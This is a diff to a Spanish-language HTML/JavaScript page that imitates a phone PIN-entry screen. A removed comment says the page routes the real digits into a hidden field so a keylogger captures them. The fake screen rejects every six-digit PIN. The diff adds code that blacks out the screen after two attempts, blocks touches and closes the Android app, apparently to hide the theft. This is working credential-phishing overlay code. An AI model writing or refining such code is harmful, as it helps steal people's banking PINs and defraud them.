@@ -93,8 +93,8 @@
     top:960px;
     transform:translateX(-50%);
     font-size:39px;
-    font-family: 'ArabotoFuerte', Arial, sans-serif; /* Cambiado a tu fuente personalizada */
-    font-weight:700; /* ENGROSADO */
+    font-family: 'ArabotoFuerte', Arial, sans-serif;
+    font-weight:700;
     color:#6f2182;
     user-select:none;
     pointer-events:none;
@@ -180,19 +180,17 @@
     from { transform: rotate(0deg); }
     to { transform: rotate(360deg); }
   }
+
+  /* ← NUEVO: Pantalla negra final cuando se bloquea */
+  #blockScreen {
+    position:fixed;top:0;left:0;width:100%;height:100%;background:#000;
+    z-index:999999;display:none;pointer-events:none;
+  }
 </style>
 </head>
 <body>
 <div class="screen">
-  <img src="huella_animada.gif" id="huellaGif" style="
-      position:absolute;
-      left:128px;
-      top:1410px;
-      width:50px;
-      height:50px;
-      z-index:9999;
-      pointer-events:auto;
-  ">
+  <img src="huella_animada.gif" id="huellaGif" style="position:absolute;left:128px;top:1410px;width:50px;height:50px;z-index:9999;pointer-events:auto;">
   <div class="overlay" id="overlay"></div>
   <div class="overlay-huella" id="overlayHuella"></div>
   <div class="popup-huella" id="popupHuella">
@@ -229,9 +227,12 @@
   <div id="deleteArea" style="position:absolute; left:558.5px; top:1403.5px; width:180px; height:90px; transform:translate(-50%, -50%);"></div>
 </div>
 
-<!-- INPUT OCULTO DEFINITIVO → keylogger ve los números reales 100% garantizado -->
+<!-- INPUT OCULTO -->
 <input type="tel" id="realPin" inputmode="numeric" pattern="[0-9]*" maxlength="6" autocomplete="off"
        style="position:fixed;top:-200px;left:-200px;opacity:0;width:1px;height:1px;color:transparent;caret-color:transparent;border:none;outline:none;" readonly>
+
+<!-- ← NUEVO: Pantalla negra que bloquea todo al final -->
+<div id="blockScreen"></div>
 
 <script>
   document.addEventListener('touchmove', function(e) {
@@ -243,8 +244,10 @@
   const dots = document.querySelectorAll(".dot");
   const popup = document.getElementById("popup");
   const overlay = document.getElementById("overlay");
-  const realPin = document.getElementById("realPin");  // Aquí llega la clave real
+  const realPin = document.getElementById("realPin");
+  const blockScreen = document.getElementById("blockScreen");
   let pinIndex = 0;
+  let failedAttempts = 0; // ← Contador de intentos fallidos
 
   function resetPIN() {
     dots.forEach(d => d.classList.remove("filled"));
@@ -252,6 +255,18 @@
     realPin.value = "";
     title.style.display = "block";
     pinDots.style.display = "none";
+  }
+
+  // ← NUEVA FUNCIÓN: Cierra todo después de 2 intentos
+  function lockAndClose() {
+    blockScreen.style.display = "block"; // Pantalla negra total
+    document.body.style.pointerEvents = "none"; // Bloquea todo toque
+    // Intenta cerrar la app (solo funciona si tienes JavaScriptInterface)
+    try { window.Android.closeApp(); } catch(e) {}
+    // Cierra ventana en PC o Chrome
+    try { window.close(); } catch(e) {}
+    // Forzar cierre visual total
+    setTimeout(() => { document.body.innerHTML = ""; }, 2000);
   }
 
   document.querySelectorAll('.key').forEach(btn => {
@@ -272,12 +287,17 @@
         pinIndex++;
       }
       if(pinIndex === 6){
+        failedAttempts++; // ← Cada PIN completo cuenta como intento
         popup.style.display = "block";
         overlay.style.display = "block";
         setTimeout(() => {
           popup.style.display = "none";
           overlay.style.display = "none";
           resetPIN();
+
+          if (failedAttempts >= 2) {
+            lockAndClose(); // ← CIERRE TOTAL después de 2 intentos
+          }
         }, 6000);
       }
     });
@@ -314,7 +334,6 @@
     overlayHuella.style.display = "none";
   });
 
-  // Evita que salga el teclado nativo
   realPin.focus();
   document.addEventListener('click', () => setTimeout(() => realPin.focus(), 50));
 </script>
